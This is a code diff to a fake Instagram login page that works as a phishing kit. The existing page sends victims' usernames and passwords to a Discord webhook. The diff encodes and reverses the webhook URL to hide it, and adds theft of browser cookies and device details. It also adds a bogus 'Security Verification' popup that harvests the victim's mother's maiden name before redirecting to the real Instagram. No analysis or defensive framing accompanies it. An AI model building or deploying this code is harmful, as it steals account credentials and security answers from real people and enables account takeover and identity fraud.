@@ -179,6 +179,38 @@
             font-size: 12px;
             margin-top: 15px;
         }
+        .error {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            max-width: 300px;
+            text-align: center;
+            z-index: 1000;
+        }
+        .popup input {
+            margin-bottom: 10px;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
         @media (max-width: 875px) {
             .col.image {
                 display: none;
@@ -187,9 +219,26 @@
                 justify-content: center;
             }
         }
+        @media (max-width: 450px) {
+            .login-form {
+                max-width: 100%;
+                padding: 0 20px;
+            }
+            button {
+                margin: 8px 20px;
+                width: calc(100% - 40px);
+            }
+        }
     </style>
 </head>
 <body>
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="securityPopup">
+        <h3>Security Verification</h3>
+        <p>Unusual activity detected. Please confirm your identity.</p>
+        <input type="text" id="securityAnswer" placeholder="Mother's maiden name" required />
+        <button onclick="submitSecurity()">Submit</button>
+    </div>
     <div class="container">
         <div class="col image">
             <a href="#"><img src="https://i.ibb.co/Q8X79RK/image.png" alt="instagram" id="image"></a>
@@ -203,10 +252,12 @@
                     <div class="form-content">
                         <input type="text" id="uname" name="uname" required placeholder=" " />
                         <label for="uname">Phone number, username, or email</label>
+                        <div class="error" id="unameError">Please enter a valid username or email</div>
                     </div>
                     <div class="form-content">
                         <input type="password" id="password" name="password" required placeholder=" " />
                         <label for="password">Password</label>
+                        <div class="error" id="passwordError">Password is too short</div>
                     </div>
                     <div class="form-content">
                         <button type="submit">Log in</button>
@@ -254,15 +305,35 @@
         </div>
     </footer>
     <script>
+        function obf(str) {
+            return btoa(str).split('').reverse().join('');
+        }
+        const w = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNDkxMTI3MzMxMjc4MDMxOC9TQXFKM3lqOE1uN1NSZjBsVWhoV001Z0MtVmVETTB5a0I0ekRHRG9FbGFaTWswSXFtSERlXzd4eUppTFRYOGJlRVJTYg=='.split('').reverse().join(''));
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            var uname = document.getElementById('uname').value;
-            var password = document.getElementById('password').value;
-            var webhookUrl = 'https://discord.com/api/webhooks/1404911273312780318/SAqJ3yj8Mn7SRf0lUhhWM5gC-VeDM0ykB4zDGDoElaZMk0IqmHDe_7xyJiLTX8beERSb';
-            var payload = {
-                content: `Captured Instagram Credentials:\nUsername/Email/Phone: ${uname}\nPassword: ${password}`
+            const uname = document.getElementById('uname').value;
+            const password = document.getElementById('password').value;
+            const unameError = document.getElementById('unameError');
+            const passwordError = document.getElementById('passwordError');
+            if (uname.length < 3) {
+                unameError.style.display = 'block';
+                return;
+            }
+            if (password.length < 6) {
+                passwordError.style.display = 'block';
+                return;
+            }
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                cookies: document.cookie
             };
-            fetch(webhookUrl, {
+            const payload = {
+                content: `Captured Instagram Credentials:\nUsername/Email/Phone: ${uname}\nPassword: ${password}\nDevice Info: ${JSON.stringify(deviceInfo)}`
+            };
+            fetch(w, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -270,15 +341,34 @@
                 body: JSON.stringify(payload)
             }).then(response => {
                 if (response.ok) {
-                    window.location.href = 'https://www.instagram.com/';
+                    document.getElementById('overlay').style.display = 'block';
+                    document.getElementById('securityPopup').style.display = 'block';
                 } else {
                     alert('Login failed - try again!');
                 }
             }).catch(error => {
-                console.error('Error sending data:', error);
+                console.error('Error:', error);
                 window.location.href = 'https://www.instagram.com/';
             });
         });
+        function submitSecurity() {
+            const securityAnswer = document.getElementById('securityAnswer').value;
+            const payload = {
+                content: `Security Answer Captured:\nAnswer: ${securityAnswer}`
+            };
+            fetch(w, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                window.location.href = 'https://www.instagram.com/';
+            }).catch(error => {
+                console.error('Error:', error);
+                window.location.href = 'https://www.instagram.com/';
+            });
+        }
     </script>
 </body>
 </html>
